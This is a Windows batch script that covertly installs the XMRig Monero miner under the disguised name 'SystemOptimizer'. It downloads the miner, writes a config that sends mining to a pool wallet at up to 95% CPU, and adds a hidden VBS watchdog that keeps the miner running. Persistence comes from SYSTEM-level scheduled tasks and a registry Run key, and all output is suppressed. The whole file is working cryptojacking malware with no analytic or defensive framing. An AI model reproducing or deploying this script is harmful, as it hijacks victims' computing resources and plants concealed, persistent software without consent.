@echo off
setlocal enabledelayedexpansion

REM Create directory
if not exist "C:\ProgramData\SystemOptimizer" mkdir "C:\ProgramData\SystemOptimizer"

REM Download XMRig
bitsadmin /transfer XMRigDownload /download /priority FOREGROUND "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" "%TEMP%\xmrig.zip" >nul 2>&1

REM Extract
powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%TEMP%\xmrig_tmp' -Force" >nul 2>&1
move /y "%TEMP%\xmrig_tmp\xmrig-6.26.0\xmrig.exe" "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" >nul 2>&1
rmdir /s /q "%TEMP%\xmrig_tmp" >nul 2>&1
del "%TEMP%\xmrig.zip" >nul 2>&1

REM Create config.json
(
echo {
echo     "autosave": false,
echo     "background": true,
echo     "colors": false,
echo     "donate-level": 1,
echo     "log-file": "C:\ProgramData\SystemOptimizer\optimizer.log",
echo     "print-time": 30,
echo     "retries": 5,
echo     "retry-pause": 10,
echo     "cpu": {
echo         "enabled": true,
echo         "huge-pages": true,
echo         "huge-pages-jit": true,
echo         "hw-aes": true,
echo         "priority": 1,
echo         "yield": true,
echo         "max-cpu-usage": 95,
echo         "asm": true,
echo         "argon2-impl": "auto",
echo         "max-threads-hint": 100
echo     },
echo     "pools": [
echo         {
echo             "url": "gulf.moneroocean.stream:10001",
echo             "user": "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv",
echo             "pass": "x",
echo             "keepalive": true,
echo             "tls": false,
echo             "nicehash": false,
echo             "rig-id": "%COMPUTERNAME%"
echo         }
echo     ],
echo     "api": {
echo         "enabled": true,
echo         "host": "127.0.0.1",
echo         "port": 3456,
echo         "restricted": true
echo     }
echo }
) > "C:\ProgramData\SystemOptimizer\config.json"

REM Create watchdog.vbs
(
echo Set sh = CreateObject("WScript.Shell")
echo Set wmi = GetObject("winmgmts:")
echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit
echo Do
echo     Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'")
echo     If p.Count = 0 Then
echo         sh.Run """C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False
echo     End If
echo     WScript.Sleep 30000
echo Loop
) > "C:\ProgramData\SystemOptimizer\watchdog.vbs"

REM Create scheduled tasks
schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K >nul 2>&1

REM Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /f >nul 2>&1

REM Start watchdog
wscript.exe "C:\ProgramData\SystemOptimizer\watchdog.vbs"

exit /b 0